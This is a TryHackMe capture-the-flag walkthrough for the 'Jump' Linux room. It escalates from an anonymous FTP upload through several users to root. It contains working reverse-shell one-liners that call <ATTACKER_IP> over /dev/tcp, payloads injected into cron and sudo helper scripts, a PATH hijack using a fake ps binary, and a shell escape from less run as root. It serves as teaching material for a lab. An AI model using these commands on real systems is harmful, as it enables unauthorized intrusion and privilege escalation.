# TryHackMe - Jump Walkthrough (Full Chain)

## Challenge Info

| Category   | Value |
|---|---|
| Platform | TryHackMe |
| OS | Linux (Ubuntu) |
| Objective | `recon_user → dev_user → monitor_user → ops_user → root` |

> Note: this writeup completes the full chain to root, filling the gap left in the earlier partial writeup.

---

## Step 1 — Recon

```bash
nmap -sC -sV <TARGET_IP> -p- --min-rate 1000
```

**Findings:**
- `21/tcp` — vsftpd 3.0.5, **anonymous FTP login allowed**, `/incoming` writable
- `22/tcp` — OpenSSH
- `README.txt` on the FTP share confirms files dropped in `/incoming` are auto-processed

---

## Step 2 — Exploit the Pipeline → `recon_user`

Upload a reverse shell script via anonymous FTP:

```bash
ftp> put revshell.sh
```

Start a listener and catch the shell once the pipeline executes it:

```bash
nc -lnvp 5556
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Step 3 — `recon_user` Flag

```bash
cd ~ && cat flag.txt
```
→ Flag 1

---

## Step 4 — Find the Next Hop with `pspy`

Upload the static `pspy64` binary and run it to observe scheduled/background processes without needing elevated privileges:

```bash
./pspy64
```

Output reveals:
```
UID=1002  PID=xxxx  | /bin/bash /opt/dev/backup.sh
```

This shows `backup.sh` running periodically under **`dev_user` (UID 1002)**.

Confirm group membership and permissions:
```bash
cat /etc/group        # dev_user:x:1002:recon_user
ls -al /opt/dev/backup.sh
# -rwxrwxr-x 1 dev_user dev_user ... backup.sh   ← group-writable
```

---

## Step 5 — Hijack `backup.sh` → `dev_user`

Since the script is writable, append a reverse shell payload:

```bash
cat /opt/dev/backup.sh
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user
sh -i >& /dev/tcp/<ATTACKER_IP>/5556 0>&1
```

Catch the shell when the scheduled job fires:
```bash
nc -lnvp 5556
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**`dev_user` flag:**
```bash
cat flag.txt
```
→ Flag 2

---

## Step 6 — Find the Next Hop: `healthcheck` Service

Running `pspy` again as `dev_user` reveals a recurring process:
```
/bin/bash /usr/local/bin/healthcheck
```

Inspecting it:
```bash
cat /usr/local/bin/healthcheck
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
  ps aux | grep -v grep
  sleep 5
done
```

Ownership and the systemd unit show it runs as `monitor_user`:
```bash
ls -al /usr/local/bin/healthcheck
# -rwxr-xr-x 1 monitor_user monitor_user ... healthcheck

cat /etc/systemd/system/healthcheck.service
[Service]
Type=simple
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
```

Key detail: the service's `PATH` puts **`/opt/dev/bin` first** — and the script calls `ps aux`, which will resolve to any `ps` binary sitting in that directory before the real system one.

---

## Step 7 — PATH Hijack via `ps` → `monitor_user`

A `ps` file already exists in `/opt/dev/bin` (writable by `dev_user`) but lacks execute permission:
```bash
ls -al /opt/dev/bin/ps
# -rw-rw-r-- 1 dev_user dev_user ... ps
```

Overwrite it with a reverse shell and make it executable:
```bash
echo "setsid bash -i >& /dev/tcp/<ATTACKER_IP>/5522 0>&1" >> /opt/dev/bin/ps
chmod a+x /opt/dev/bin/ps
```

When the `healthcheck` service (running as `monitor_user`) next calls `ps aux`, it executes the malicious binary instead of the real one, due to the PATH order.

```bash
nc -lnvp 5522
```

**`monitor_user` flag:**
```bash
cd /home/monitor_user && cat flag.txt
```
→ Flag 3

---

## Step 8 — Enumerate sudo Rights → `ops_user`

```bash
sudo -l
```
```
User monitor_user may run the following commands on tryhackme-2404:
    (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

`deploy.sh` itself isn't writable, but it calls a helper script that is:
```bash
cat /usr/local/bin/deploy.sh
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh

ls -al /opt/app/deploy_helper.sh
# -rwxr-xr-x 1 monitor_user monitor_user ... deploy_helper.sh  ← writable by monitor_user
```

Inject a reverse shell:
```bash
echo "setsid bash -i >& /dev/tcp/<ATTACKER_IP>/1212 0>&1" >> /opt/app/deploy_helper.sh
```

Trigger it via the allowed sudo command:
```bash
sudo -u ops_user /usr/local/bin/deploy.sh
```

```bash
nc -lnvp 1212
```

**`ops_user` flag:**
```bash
cd /home/ops_user && cat flag.txt
```
→ Flag 4

---

## Step 9 — Final Escalation → `root` (GTFOBins)

```bash
sudo -l
```
```
User ops_user may run the following commands on tryhackme-2404:
    (root) NOPASSWD: /usr/bin/less
```

`less` is a known GTFOBins sudo-escalation binary — invoking a shell from within its pager breaks out as root:
```bash
sudo -u root /usr/bin/less /etc/hosts
# at the "(END)" prompt, type:
!/bin/sh
```

**`root` flag:**
```bash
cd /root && cat flag.txt
```
→ Flag 5

---

## Full Chain Summary

| Stage | Technique |
|---|---|
| Anonymous → `recon_user` | Anonymous FTP upload to auto-processed `/incoming` pipeline |
| `recon_user` → `dev_user` | `pspy` spotted a cron/scheduled job running a group-writable `backup.sh` |
| `dev_user` → `monitor_user` | PATH hijack — writable `ps` binary placed ahead of the real one in a systemd service's `PATH` |
| `monitor_user` → `ops_user` | `sudo -l` allowed running `deploy.sh` as `ops_user`; its helper script was writable |
| `ops_user` → `root` | `sudo -l` allowed `less` as root → GTFOBins shell escape |

## Key Takeaways

- `pspy` is invaluable for spotting cron jobs/services running as other users without needing root.
- Writable scripts, binaries, or PATH entries referenced by a privileged process/service are a direct escalation vector.
- Always run `sudo -l` at every stage — it often reveals the next hop directly.
- Check GTFOBins for any binary allowed via sudo; many (`less`, `vim`, `find`, etc.) have trivial shell-escape primitives.
